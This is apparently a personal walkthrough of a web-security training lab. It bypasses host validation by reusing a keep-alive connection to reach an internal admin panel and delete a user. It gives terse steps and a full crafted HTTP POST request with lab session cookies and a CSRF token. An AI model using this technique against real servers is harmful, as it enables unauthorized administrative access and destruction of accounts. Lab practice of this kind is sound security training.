# **Host validation bypass via connection state attack**

Task: To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user `carlos.`  
Toolkit: BurpSuite, Browser

1. send req with /admin and HOST 192.168.0.1 → get 301 moved  
2. send this req with normal (connection keep-alive) in group, single coonection→ get 200ok  
3. malform req to this, as it says in previous req  
   

POST /admin/delete HTTP/1.1  
Host: 192.168.0.1  
Cookie: session=BhnSFQ3P3Y271nUnqDmBJyJZ6wf0CMSe; \_lab=47%7cMC0CFQCRuDYvkDmjNK2%2fcgQnnYavuQzv8QIUXqnYtToT6rxlkhLVLwgbuBtdAXmyB9aJf6uCApAEN2C43sogfGZTN7AbV0l3tdzXgPJKYDnNg76DKL%2fUfjb%2bRWX7C4%2f%2fmAl09QDtHNOqlAOTAFBrVUFGonUkd99i7vKVYjqCe2hL1aaDmJa6  
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"  
Sec-Ch-Ua-Mobile: ?0  
Sec-Ch-Ua-Platform: "Linux"  
Accept-Language: en-US,en;q=0.9  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Sec-Fetch-Site: same-origin  
Sec-Fetch-Mode: navigate  
Sec-Fetch-User: ?1  
Sec-Fetch-Dest: document  
Referer: https://0ac500a204abe442828f1ff4008d0027.h1-web-security-academy.net/  
Accept-Encoding: gzip, deflate, br  
Priority: u=0, i  
Connection: keep-alive  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 53

csrf=xDjDb6kqA5Rh3xiqCBQNOVcVvW02Vl0W\&username=carlos

302 Solved